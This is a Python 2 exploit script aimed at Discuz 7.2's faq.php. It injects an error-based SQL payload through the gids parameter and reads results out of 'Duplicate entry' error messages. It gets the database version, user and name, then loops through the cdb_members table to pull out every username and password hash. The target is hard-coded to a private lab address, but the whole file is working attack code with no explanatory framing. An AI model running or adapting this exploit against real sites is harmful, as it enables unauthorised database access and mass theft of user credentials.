# coding=utf-8
import urllib
import urllib2
import re
import sys

def gethtml(url, sql):
    link = url + "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat("
    link = link + "("+ urllib.quote(sql) + "),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
    fd = urllib2.urlopen(link)

    #print fd.readlines()
    errorinfo = None
    for line in fd.readlines():
        if line.find("Duplicate entry") != -1:
            errorinfo = line
            break

    #print errorinfo
    if errorinfo is None:
        return None

    ret = errorinfo.split("\'")[1][0:-1]
    if ret is None:
        return None

    #print ret
    return ret


def usage():
  if len(sys.argv) < 2:
    print ''
    print 'Usage:' 
    print '  python diz7.2.py [url] '
    sys.exit(1)


def main():
    usage()

    url = sys.argv[1]
    url = "http://172.16.28.132/Discuz/Discuz_7.2_SC_UTF8/upload"
    dbversion = gethtml(url, "version()")
    dbuser = gethtml(url, "user()")
    dbdatabase = gethtml(url, "database()")

    dblen = gethtml(url, "select count(password) from cdb_members ")
    cdb_members_username = []
    cdb_members_password = []

    for loop in range(int(dblen)):
        username_list = "select username from cdb_members limit %d,1" % loop
        password_list = "select password from cdb_members limit %d,1" % loop
        cdb_members_username.append(gethtml(url, username_list))
        cdb_members_password.append(gethtml(url, password_list))

    print dbversion
    print dbuser
    print dbdatabase
    print cdb_members_username
    print cdb_members_password
#main()


if __name__ == "__main__":
    main()


